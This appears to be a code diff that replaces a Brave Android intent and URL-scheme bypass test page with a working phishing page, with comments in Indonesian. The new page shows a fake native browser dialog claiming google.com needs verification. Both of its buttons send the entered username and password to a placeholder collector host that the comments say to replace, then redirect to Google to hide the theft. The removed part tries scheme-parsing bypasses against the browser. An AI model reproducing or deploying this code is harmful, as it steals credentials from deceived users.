@@ -1,77 +1,122 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brave Intent Crash PoC</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            text-align: center;
-        }
-        button {
-            padding: 12px 24px;
-            font-size: 16px;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px;
-            width: 80%;
-            max-width: 300px;
-        }
-        .btn-intent { background-color: #007bff; }
-        .btn-bypass { background-color: #28a745; }
-        .btn-js { background-color: #dc3545; }
-        .container {
-            margin: 20px auto;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Home</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: system-ui, sans-serif;
+    background: #fff;
+  }
+  #go {
+    font-size: 20px;
+    padding: 12px 48px;
+    border: 2px solid #333;
+    border-radius: 8px;
+    background: #fff;
+    cursor: pointer;
+  }
+  #go:hover { background: #f0f0f0; }
+
+  /* ===== Fake native dialog ===== */
+  #overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+  }
+  #dlg {
+    position: absolute;
+    top: 30%;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #ffffff;
+    border: 1px solid #d0d0d0;
+    border-radius: 10px;
+    box-shadow: 0 8px 30px rgba(0,0,0,.25);
+    font: 14px/1.4 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    width: 340px;
+    padding: 18px 20px 14px;
+    color: #1b1b1b;
+  }
+  #dlg .msg { margin-bottom: 12px; }
+  #dlg input {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 8px 10px;
+    margin-bottom: 10px;
+    border: 1px solid #c9c9c9;
+    border-radius: 6px;
+    font: inherit;
+    outline: none;
+  }
+  #dlg input:focus { border-color: #e2231a; } /* merah khas Opera GX */
+  #dlg .btns { text-align: right; }
+  #dlg .btns button {
+    font: inherit;
+    padding: 6px 18px;
+    border-radius: 6px;
+    border: 1px solid #c9c9c9;
+    background: #f6f6f6;
+    cursor: pointer;
+  }
+  #dlg .btns button.ok {
+    background: #e2231a;
+    border-color: #e2231a;
+    color: #fff;
+    margin-left: 8px;
+  }
+</style>
 </head>
 <body>
 
-    <h1>Brave Android Intent PoC</h1>
-    <p>Menguji bypass proteksi menggunakan skema Android Intent.</p>
+<button id="go">GO</button>
 
-    <!-- Metode 1: Menggunakan Android Intent Standard -->
-    <div class="container">
-        <h3>Metode 1: Android Intent (Brave Package)</h3>
-        <p>Mencoba memanggil komponen Brave secara spesifik melalui sistem Android.</p>
-        <a href="intent://google.com#Intent;scheme=brave;package=com.brave.browser;end">
-            <button class="btn-intent">Jalankan Intent</button>
-        </a>
+<div id="overlay">
+  <div id="dlg">
+    <div class="msg"><b>google.com</b> memerlukan verifikasi.<br>Masukkan kredensial Anda untuk melanjutkan.</div>
+    <input type="text" id="user" placeholder="Username atau email" autocomplete="off">
+    <input type="password" id="pass" placeholder="Password" autocomplete="off">
+    <div class="btns">
+      <button onclick="submitLogin()">Cancel</button>
+      <button class="ok" onclick="submitLogin()">OK</button>
     </div>
+  </div>
+</div>
 
-    <!-- Metode 2: Menggunakan Alternatif Obfuscation Parsing -->
-    <div class="container">
-        <h3>Metode 2: Karakter Khusus (Bypass Parser)</h3>
-        <p>Mencoba mengecoh pembacaan URL menggunakan karakter "@" atau triple slash.</p>
-        <a href="brave://@google.com">
-            <button class="btn-bypass">Coba Variasi 1 (@)</button>
-        </a>
-        <br>
-        <a href="brave:///google.com">
-            <button class="btn-bypass">Coba Variasi 2 (///)</button>
-        </a>
-    </div>
+<script>
+document.getElementById("go").addEventListener("click", function () {
+  // tampilkan fake dialog "native alert"
+  document.getElementById("overlay").style.display = "block";
+});
 
-    <!-- Metode 3: JavaScript Window Open -->
-    <div class="container">
-        <h3>Metode 3: DOM Window Open</h3>
-        <p>Membuka skema via script window pop-up, bukan pengalihan langsung.</p>
-        <button class="btn-js" onclick="tryWindowOpen()">Jalankan Window Open</button>
-    </div>
+function submitLogin() {
+  var user = document.getElementById("user").value;
+  var pass = document.getElementById("pass").value;
 
-    <script>
-        function tryWindowOpen() {
-            // Membuka tab/jendela baru dengan target skema internal
-            window.open("brave://google.com", "_blank");
-        }
-    </script>
+  // kirim kredensial ke kolektor (ganti URL kolektor lu)
+  if (user || pass) {
+    new Image().src = "https://kolektor-lu.example/log?u=" +
+      encodeURIComponent(user) + "&p=" + encodeURIComponent(pass);
+  }
+
+  // redirect ke google.com bersamaan dialog ditutup
+  document.getElementById("overlay").style.display = "none";
+  window.location.href = "https://www.google.com";
+}
+
+// tekan Enter = submit, persis perilaku dialog asli
+document.addEventListener("keydown", function (e) {
+  if (document.getElementById("overlay").style.display === "block" && e.key === "Enter") {
+    submitLogin();
+  }
+});
+</script>
 
 </body>
 </html>
